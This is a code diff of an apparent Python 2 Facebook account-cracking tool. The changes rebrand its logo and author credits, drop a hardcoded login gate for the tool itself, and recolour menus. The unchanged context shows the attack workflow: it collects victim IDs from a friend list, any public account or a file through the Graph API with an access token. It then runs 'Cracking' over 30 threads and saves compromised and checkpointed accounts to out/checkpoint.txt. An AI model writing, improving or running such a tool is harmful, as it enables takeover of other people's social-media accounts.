@@ -37,19 +37,20 @@ def jalan(z):
 		time.sleep(00000.1)
 ##### LOGO #####
 logo = """
- _     _          ___         _
- | \   / |       |  __ \     | |
- | \   / |_ __   | |  | |    | |
- | |\ /| | '_|   | |  | |    | |
- | |   | | |     | |__| | |__| |
- |_|   |_|_|     |_____/  \___/
- 
-\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mDJ
-\033[1;96mYouTube \033[1;93m: \033[1;92mAnonymous Trickers
-\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/FAKHAR143/Mr_DJ
-\033[1;96mBlogger \033[1;93m: \033[1;92mhttps://www.facebook.com/Anonymoustricker1
-\033[1;91m======================================="""
+\033[1;96m█████████
+\033[1;96m█▄█████▄█      \033[1;91m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
+\033[1;96m█\033[1;91m▼▼▼▼▼ \033[1;95m- _ --_--\033[1;95m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ 
+\033[1;96m█ \033[1;92m \033[1;95m_-_-- -_ --__\033[1;94m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗v1.5
+\033[1;96m█\033[1;91m▲▲▲▲▲\033[1;95m--  - _ --\033[1;96m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[1;93mZee
+\033[1;96m█████████      \033[1;92m«----------✧----------»
+\033[1;96m ██ ██
+            \033[1;91m  \x1b[7m➺➺ Author: ZeDD ㋡㋡\x1b[0m
+\033[1;91m╔═══════════════════════\033[1;94m══════════════════════╗
+\033[1;93m║\033[1;93m* \033[1;97mAuthor  \033[1;91m: \033[1;33m[ZɘDD]                           \033[1;94m║
+\033[1;95m║\033[1;93m* \033[1;97mGitHub  \033[1;91m: \033[1;92m[https//:github.com/Em710]       \033[1;95m║
+\033[1;94m║\033[1;93m* \033[1;97mSupport \033[1;91m: \033[1;98m[Rʌɱzʌŋ] \033[1;95m[Gɱ & Aɗŋʌŋ] \033[1;96m[Hʌsɘɘɓ]   \033[1;93m║
+\033[1;94m╚═══════════════════════\033[1;91m══════════════════════╝"""
+
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
@@ -64,30 +65,6 @@ listgrup = []
 vulnot = "\033[31mNot Vuln"
 vuln = "\033[32mVuln"
 os.system("clear")
-print "\033[1;96m ========================================="
-print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mDJ
-\033[1;96mYouTube \033[1;93m: \033[1;92mAnonymous Trickers
-\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/FAKHAR143/Mr_DJ
-\033[1;96mpage \033[1;93m: \033[1;92mhttps://www.facebook.com/Anonymoustricker1
-\033[1;91m======================================="""
-print " \x1b[1;93m============================================================="
-CorrectUsername = "DJDJDJ"
-CorrectPassword = "DJDJDJ"
-loop = 'true'
-while (loop == 'true'):
-    username = raw_input("\033[1;96m \x1b[1;93mUsername Of Tool \x1b[1;96m>>>> ")
-    if (username == CorrectUsername):
-    	password = raw_input("\033[1;96m \x1b[1;93mPassword Of Tool \x1b[1;96m>>>> ")
-        if (password == CorrectPassword):
-            print "Logged in successfully as " + username
-            loop = 'false'
-        else:
-            print "Wrong Password"
-            os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
-    else:
-        print "Wrong Username"
-        os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
 def masuk():
     os.system('clear')
     print logo
@@ -214,13 +191,13 @@ def menu():
 		keluar()
 	os.system("clear")
 	print logo
-	print " THESE COMMANDS ARE ONLY WORKING ON DATA NOT ON WIFI "
+	print " THESE COMMANDS ARE ONLY WORKING ON DATA & WIFI "
+	print 42*"\033[1;97m="
+	print "\033[1;97m[\033[1;97m \033[1;97m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
+	print "\033[1;97m[\033[1;97m \033[1;97m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
 	print 42*"\033[1;96m="
-	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
-	print "\033[1;96m[\033[1;97m \033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
-	print 42*"\033[1;96m="
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Start CLONING WITH DJ"
-	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Exit            "
+	print "\x1b[1;97m[\x1b[1;92m1\x1b[1;97m]\x1b[1;93m Start CLONING"
+	print "\x1b[1;97m[\x1b[1;91m0\x1b[1;97m]\x1b[1;91m Exit"
 	pilih()
 def pilih():
 	unikers = raw_input("\n\033[1;97m >>> \033[1;97m")
@@ -248,7 +225,7 @@ def super():
 		login()
 	os.system('clear')
 	print logo
-	print 42*"\033[1;96m="
+	print 42*"\033[1;97m="
 	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Crack From Friend List"
 	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Crack From Any Public ACCOUNT"
 	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Crack From File"
@@ -262,7 +239,7 @@ def pilih_super():
 	elif peak =="1":
 		os.system('clear')
 		print logo
-		print 42*"\033[1;96m="
+		print 42*"\033[1;97m="
 		jalan('\033[1;96m \033[1;93mGetting ID \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
@@ -271,7 +248,7 @@ def pilih_super():
 	elif peak =="2":
 		os.system('clear')
 		print logo
-		print 42*"\033[1;96m="
+		print 42*"\033[1;97m="
 		idt = raw_input("\033[1;96m \033[1;93mEnter ID \033[1;91m: \033[1;97m")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
@@ -289,7 +266,7 @@ def pilih_super():
 	elif peak =="3":
 		os.system('clear')
 		print logo
-		print 42*"\033[1;96m="
+		print 42*"\033[1;97m="
 		try:
 			idlist = raw_input('\x1b[1;96m \x1b[1;93mEnter File Path  \x1b[1;91m: \x1b[1;97m')
 			for line in open(idlist,'r').readlines():
@@ -311,7 +288,7 @@ def pilih_super():
 		print("\r\033[1;96m[\033[1;97m \033[1;96m] \033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print
 	print('\x1b[1;96m \x1b[1;93mTo Stop Process Press CTRL Then Press z . WAMIMG DONT USE THESE COMMANDS FOR ILLEGALL PURPOSE')
-	print 42*"\033[1;96m="
+	print 42*"\033[1;97m="
 	
 			
 	def main(arg):
@@ -430,7 +407,7 @@ def pilih_super():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print 42*"\033[1;96m="
+	print 42*"\033[1;97m="
 	print '\033[1;96m[\033[1;97m \033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
 	print"\033[1;96m[+] \033[1;92mTotal OK\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
 	print("\033[1;96m[+] \033[1;92m THANKS FOR USING MY COMMAND ! WE WILL RIGHT BACK  \033[1;91m: \033[1;97mout/checkpoint.txt")
